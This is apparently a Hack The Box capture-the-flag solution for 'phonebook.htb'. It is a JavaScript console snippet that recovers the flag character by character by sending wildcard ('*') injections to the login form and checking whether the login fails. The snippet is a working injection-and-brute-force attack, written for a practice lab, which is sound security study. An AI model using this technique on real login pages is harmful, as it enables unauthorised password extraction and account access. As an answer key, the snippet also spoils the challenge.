# phonebook.htb
New (9.8.2020): You can now login using the workstation username and password! - Reese

```js
// Run it in the Chrome DevTools Console
let flag="HTB",dict ="}{ ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!~.?@#$%^&_-+=?<>😾".split('')
while(1) {
    for (var s of dict) {
        const {url:u} = await fetch('/login',{body:new URLSearchParams({username:'*',password:flag+s+'*'}),method:"POST"})
        if (console.log(flag+s)||!u.includes("failed")&&(flag += s)) break
    }
    if (['}','😾'].includes(s)) break
}
```
